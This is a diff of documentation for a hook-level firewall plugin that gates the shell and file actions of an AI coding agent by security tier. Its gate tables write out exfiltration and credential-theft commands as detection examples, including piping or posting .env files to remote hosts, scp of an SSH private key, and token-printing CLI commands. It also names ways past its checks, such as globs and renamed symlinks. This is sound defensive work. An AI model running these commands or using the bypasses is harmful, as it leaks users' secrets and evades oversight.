@@ -1,6 +1,6 @@
 # Firewall tiers
 
-safe-ai-skill takes a **tier** as an input and varies its gates with it. The tier is a posture, not a sandbox: the plugin is hook-level string analysis, and [what it cannot protect on its own](../README.md#read-this-first-what-this-plugin-cannot-protect-on-its-own) applies at every tier. This page tracks the unreleased changes on this branch (see the [CHANGELOG](../CHANGELOG.md)), not a released version.
+safe-ai-skill takes a **tier** as an input and varies its gates with it. The tier is a posture, not a sandbox: the plugin is hook-level string analysis, and [what it cannot protect on its own](../README.md#read-this-first-what-this-plugin-cannot-protect-on-its-own) applies at every tier. This page describes the 1.3.0 behaviour; the [CHANGELOG](../CHANGELOG.md) lists what changed in each release.
 
 ## Who owns what
 
@@ -18,7 +18,7 @@ Defence in depth is kept only where the mechanisms differ (a hook against a sysc
 
 `off < relaxed < medium < high`. The default is `relaxed`. The old names are input aliases through 1.x: `strict` is `relaxed`, `paranoid` is `high`, `autopilot` is `relaxed` (see [Migration from profiles](#migration-from-profiles)).
 
-**Off is not `SAFE_AI_SKILL_DISABLE=1`.** At Off every `deny` row of the table in the [README](../README.md#firewall-tiers) still holds: key material and credential stores, key material or an env file sent to the network, raw reads of env files other than the project's `.env`/`.env.*`, irreversible on-chain actions on mainnet or an unidentified cluster, default-wallet destruction, the tamper tripwire, the prompt guard and redaction. In a release build Off differs from Relaxed in three rows: the supply-chain deny for combination, drift, `lock_mismatch` and unscanned packs (reported instead); the exfil host list, which is empty at Off (a request to a listed host has no opinion there, and `secrets.exfil_hosts_extra` is ignored); and the raw-read deny of production env files (`.env.production`, `.env.prod*`). The other exfil checks (secret-shaped data, encoded blobs) and the tamper, env-dump and encoded-command gates apply at Off. `SAFE_AI_SKILL_DISABLE=1` stays the only switch that turns the hooks off, and the shim ignores it in strict mode and when the project's committed `.claude/settings.json` mentions it.
+**Off is not `SAFE_AI_SKILL_DISABLE=1`.** At Off every row of the [table below](#behaviour-per-gate) that denies at Off still denies: key material and credential stores, key material or an env file sent to the network, raw reads of env files other than the project's `.env`/`.env.*`, irreversible on-chain actions on mainnet or an unidentified cluster, default-wallet destruction, the tamper tripwire, the prompt guard and redaction. In a release build Off differs from Relaxed in three rows: the supply-chain deny for combination, drift, `lock_mismatch` and unscanned packs (reported instead); the exfil host list, which is empty at Off (a request to a listed host has no opinion there, and `secrets.exfil_hosts_extra` is ignored); and the raw-read deny of production env files (`.env.production`, `.env.prod*`). The other exfil checks (secret-shaped data, encoded blobs) and the tamper, env-dump and encoded-command gates apply at Off. `SAFE_AI_SKILL_DISABLE=1` stays the only switch that turns the hooks off, and the shim ignores it in strict mode and when the project's committed `.claude/settings.json` mentions it.
 
 No tier, grant, repo setting or env variable relaxes a `deny` row.
 
@@ -73,7 +73,42 @@ This is **declared configuration, not a runtime proof.** The plugin cannot see t
 
 ## Behaviour per gate
 
-The full table is in the [README](../README.md#firewall-tiers). It is the table the code is checked against; this page explains it. `n/o` is no opinion: empty stdout, and the call continues into Claude Code's own permission flow. `deny` rows are never relaxed by a grant, tier, repo setting or env variable. At High the engine never emits `allow`, and no tier emits `defer`.
+The table below is the behaviour of each gate at each tier. It is the table the code is checked against (`GATE_TABLE` in `tier.rs`); the sections that follow explain it. `n/o` is no opinion: empty stdout, and the call continues into Claude Code's own permission flow. `deny` rows are never relaxed by a grant, tier, repo setting or env variable. At High the engine never emits `allow`, and no tier emits `defer`.
+
+| Gate | Off | Relaxed | Medium | High |
+|---|---|---|---|---|
+| Credential stores and key files, read by path or by command | deny | deny | deny | deny |
+| Key material sent to a network command | deny | deny | deny | deny |
+| Project `.env` / `.env.*`, raw read (Read, Grep, Bash readers, MCP executor code) | n/o | n/o | n/o | deny |
+| … with your user-scope `env_read: deny` (or a repo's) | deny | deny | deny | deny |
+| Other env files, raw read (`.envrc`, `*.env`, `.dev.vars`, `~/.config/solana/cli/config.yml`, env files outside the project) | deny | deny | deny | deny |
+| varlock commands that print values | = raw read | = raw read | = raw read | = raw read |
+| `.env.schema` and templates (content guard applies) | n/o | n/o | n/o | n/o |
+| Write/Edit/MultiEdit, Bash write (`>`, `sed -i`, `mv`, …) or agent `env set\|unset` to a project `.env` / `.env.*` | n/o | n/o | deny | n/o |
+| … to another env file | n/o | n/o | deny | deny |
+| `env keys` | n/o | n/o | n/o | n/o |
+| Pattern redaction (keys, seeds, PEM, vendor tokens) in successful tool results | on | on | on | on |
+| Value scrub of project env values in successful tool results, except the Read response of a raw read the tier permits | on | on | on | on |
+| Irreversible on-chain action (`--final`, `program close` (program or buffer), `spl-token close-mint`/`close`/`burn`, `authorize --disable`, …) on mainnet or an unknown cluster | deny | deny | deny | deny |
+| … on a positively identified localnet, devnet or testnet (never relaxed by a grant) | ask | ask | ask | ask |
+| Default-wallet destruction (keygen `--force`, file overwrite/delete) | deny | deny | deny | deny |
+| Value-moving or authority-changing action on mainnet or an unknown cluster | ask | ask | ask | deny |
+| … with a live confirmed grant covering it (grantable scopes only) | allow | allow | allow | deny |
+| … on an identified test cluster: deploy/upgrade | n/o | n/o | n/o | n/o |
+| … transfer within spend caps | allow | allow | allow | n/o |
+| … authority change | ask | ask | ask | ask |
+| Solana command the parser cannot read (opaque or dynamic) | ask | ask | ask | deny |
+| MCP value-moving or signing tool (`gate-mcp`) | ask | ask | ask | deny |
+| Env data flowing into a network sink (`cat .env \| nc h 9`, `curl -H "$(cat .env)" …`, `scp .env`, `curl -d @.env`, `dotenv -e .env -- curl …`; not to localhost) | deny | deny | deny | deny |
+| Inline `curl`/`wget` POST body (no file upload) to a known Solana RPC host | n/o | n/o | n/o | ask |
+| Inline `curl`/`wget` POST body to any other non-localhost host, or a file-body upload (`-d @file`, `-T`, `-F k=@file`) | ask | ask | ask | ask |
+| Supply chain: combination rule, drift, lock mismatch, unscanned pack | report | deny in place | deny in place | deny in place |
+| Supply chain: HIGH heuristic (unreviewed pack) | report | report | report | deny in place |
+| Tamper tripwire, authenticated state, prompt guard | on | on | on | on |
+
+**Note: production env files.** A raw read of `.env.production`, `.env.prod` or `.env.prod*` (not a template or schema) is not a row of this table: it has no opinion at Off and is denied from Relaxed up, so it is the one exception to the "Project `.env` / `.env.*`, raw read" row at Relaxed and Medium. It keys on the name as given, so a glob, a differently named symlink or a directory Grep gets past it.
+
+What each row covers is explained in the sections below. At High the engine never emits `allow` (a grant or a within-cap transfer falls back to Claude Code's own flow), no tier emits `defer`, and headless runs turn every `ask` into a `deny`. A command line chaining two or more gated on-chain actions, or holding any hard-guard ask, is never covered by a grant, and a Bash command over 256 KiB (or with more than 2048 nested expansions) asks without being parsed (deny at High and headless). The project `.env` rows follow solana-ai-kit's tiers: open below High, written only below Medium (High leaves writes open, as the kit does, since the model can no longer read the file back). The exfil, tamper-content, git and `gh`, container, key-file, permission-request, download-and-run, env-dump, encoded-command and MCP tool-name gates are not rows of this table; their verdicts per tier are in [Tripwire gates by tier](#tripwire-gates-by-tier).
 
 ### Project `.env` files
 
@@ -147,7 +182,7 @@ One shared list, `credentials.list`, with the classes `key_material`, `host_toke
 
 - **Surfaces:** Read, file Grep, directory Grep, MCP path arguments, and any Bash command naming a store (metadata-only commands such as `ls`, `stat` and `test` excepted; a `NAME=<store path>` assignment counts). Glob lists names only and stays ungated.
 - **SSH identities:** `ssh`, `scp` and `sftp` may name a key under `~/.ssh` as their identity (`-i <key>`, `-o IdentityFile=<key>`), and `ssh-keygen -y -f <key>` may print its public key: the key is used, not printed. Any other use of a private key path (`scp ~/.ssh/id_rsa host:`, `cat`, `ssh-add`) is denied. Solana signers may name a keypair under `~/.config/solana` or a `*-keypair.json`; the on-chain gates own those commands.
-- **Directory Grep:** exclusion globs for every credential class are appended to its `glob`. A Grep rooted at or above `$HOME` gets all of them (this closes the 1.0.1 leak where a directory-wide Grep could return `.env*` contents). A Grep rooted inside a credential store is denied.
+- **Directory Grep:** exclusion globs for every credential class are appended to its `glob`. A Grep rooted at or above `$HOME` gets all of them (this closes the 1.0.1 leak where a directory-wide Grep could return `.env*` contents). This also hides `.env.example` and `.env.schema` from directory searches; read them directly. A Grep rooted inside a credential store is denied.
 - **Moved and linked stores.** A store that an environment variable relocates is protected at its new place: `GH_CONFIG_DIR`, `DOCKER_CONFIG`, `CARGO_HOME`, `AWS_SHARED_CREDENTIALS_FILE`, `AWS_CONFIG_FILE`, `KUBECONFIG`, `NPM_CONFIG_USERCONFIG`, `NETRC`, `GNUPGHOME`, `PASSWORD_STORE_DIR`, `CLOUDSDK_CONFIG`, `AZURE_CONFIG_DIR`, and `XDG_CONFIG_HOME` for every `~/.config/…` store. The hook reads these from its own environment, not from an assignment typed in the command. A single-file store is also recognised through a hard link (same device and inode), whatever the link is called or where it sits. The macOS Bitwarden desktop data directory is a store too.
 - **MCP path arguments.** A `path` argument of an MCP tool that would let a recursive reader (context-mode's indexer, a filesystem server's search) reach a store is denied: the path is at or above a store, or an immediate child is a symlink into one. A link nested deeper is a residual.
 - **Command-form readers** (plugin-internal, not path globs): `gcloud auth print-access-token` and `print-identity-token` (also under `application-default`), `gcloud config config-helper`, `az account get-access-token`, `gh auth token`, `git credential fill`, `security find-generic-password -w` and `find-internet-password -w`, `aws configure get *secret*` and `export-credentials`, `npm config get *_authToken`, `docker-credential-* get`, `secret-tool lookup`, `pass show`, `op read`, `bw get`.
@@ -158,7 +193,7 @@ One shared list, `credentials.list`, with the classes `key_material`, `host_toke
 
 ## Tripwire gates by tier
 
-Gates that judge command text, tool arguments or file content rather than a path or a cluster. They are not rows of the README table; this is their per-tier behaviour. `ask` is a deny when headless. A tier raises an `ask` to a deny only where the cell says so.
+Gates that judge command text, tool arguments or file content rather than a path or a cluster. They are not rows of the [table above](#behaviour-per-gate); this is their per-tier behaviour. `ask` is a deny when headless. A tier raises an `ask` to a deny only where the cell says so.
 
 | Gate | Off | Relaxed | Medium | High |
 |---|---|---|---|---|
@@ -421,9 +456,9 @@ A payload the gate cannot read (a variable, a command substitution, a fetched bo
 
 ## Supply chain
 
-Grading, state v2, pins, `packs.lock`, trust and approve are unchanged; only the action varies by tier (the README table). **Deny** means the Skill tool, `/slash` expansion and Read, Grep and Bash access under the pack are refused in place. **Report** means SessionStart output naming the pack, the rule, `path:line` and the approve command.
+Grading, state v2, pins, `packs.lock`, trust and approve are unchanged; only the action varies by tier (the [table above](#behaviour-per-gate)). **Deny** means the Skill tool, `/slash` expansion and Read, Grep and Bash access under the pack are refused in place. **Report** means SessionStart output naming the pack, the rule, `path:line` and the approve command.
 
-- Combination BLOCKs, drift, `lock_mismatch` and unscanned packs: report at Off, deny in place from Relaxed. A combination BLOCK is never clearable by approve or trust.
+- Combination BLOCKs, drift, `lock_mismatch` and unscanned packs: report at Off, deny in place from Relaxed. A combination BLOCK is never clearable by approve or trust. After you confirm it, `safe-ai-skill verify approve <name>` (or `verify trust <dir>`, which follows the content to other worktrees) clears drift, unreviewed packs and reviewed `packs.lock` mismatches.
 - A HIGH heuristic (`unreviewed`): report at Off, Relaxed and Medium; deny in place at High until `verify trust` or `verify approve` (user scope). A repo's `packs.lock` cannot clear it. On an ai-kit checkout at High, SessionStart prints one `verify trust` line listing them.
 - **Nothing is moved by default at any tier.** `supply_chain.on_block: move` is opt-in, never touches a git-tracked pack or a submodule path (it reads `.gitmodules` and `.git/index` and never runs git; an index it cannot read counts as tracked), and prints the origin and the restore command.
 - At High, SessionStart prints one line, `tier high denies N skill pack(s): <names> — run safe-ai-skill verify trust <pack dir>`, listing the unreviewed HIGH packs it now denies.
@@ -474,7 +509,7 @@ The full-coverage work leaves these open, as not yet covered rather than as desi
 
 `profiles:`, `ask_all`, the autopilot cap and the profile names as policy keys are removed; a policy that still has them loads, and SessionStart lists them as ignored.
 
-**1.2.0: `env_read`.** Project `.env`/`.env.*` reads now follow the tier for everyone (open below High), which is a deliberate loosening from 1.1.0's deny at every tier, made to match solana-ai-kit (#16). An install that existed before 1.2.0 and never chose `env_read` gets a one-time SessionStart line saying so, with `safe-ai-skill tier --env-read deny` to keep the 1.1.0 behaviour. A stored `env_read: ask` is rewritten as `tier` at the first 1.2.0 SessionStart with a one-time notice; a stored `tier` keeps its name and now means the default; a stored `deny` is kept and denies the reads at every tier.
+**1.2.0: `env_read`.** Project `.env`/`.env.*` reads now follow the tier for everyone (open below High), which is a deliberate loosening from 1.1.0's deny at every tier, made to match solana-ai-kit (#16). An install that existed before 1.2.0 and never chose `env_read` gets a one-time SessionStart line saying so, with `safe-ai-skill tier --env-read deny` to keep the 1.1.0 behaviour. A stored `env_read: ask` is rewritten as `tier` at the first SessionStart on the 1.2.0 engine (for a 1.0.x user, the first 1.3.0 session) with a one-time notice; a stored `tier` keeps its name and now means the default; a stored `deny` is kept and denies the reads at every tier.
 
 ## Shared lists
 
@@ -494,7 +529,9 @@ Three line-oriented files at the root of this repository in `policy/shared/`, pl
 
 ## See also
 
-- [README: Read this first](../README.md#read-this-first-what-this-plugin-cannot-protect-on-its-own) and the tier table
+- [README: Read this first](../README.md#read-this-first-what-this-plugin-cannot-protect-on-its-own)
+- [docs/cli.md](cli.md): every command and flag, and the hook table
+- [docs/upgrading.md](upgrading.md): moving from 1.0.x
 - [SECURITY.md](../SECURITY.md#recommended-setup): recommended setup, known holes by layer
 - [docs/drafts/aikit-firewall-split.md](drafts/aikit-firewall-split.md): the proposed kit-side changes
 - [ai-kit#264](https://github.com/solanabr/ai-kit/issues/264) (firewall scope) and [ai-kit#265](https://github.com/solanabr/ai-kit/issues/265) (docs)
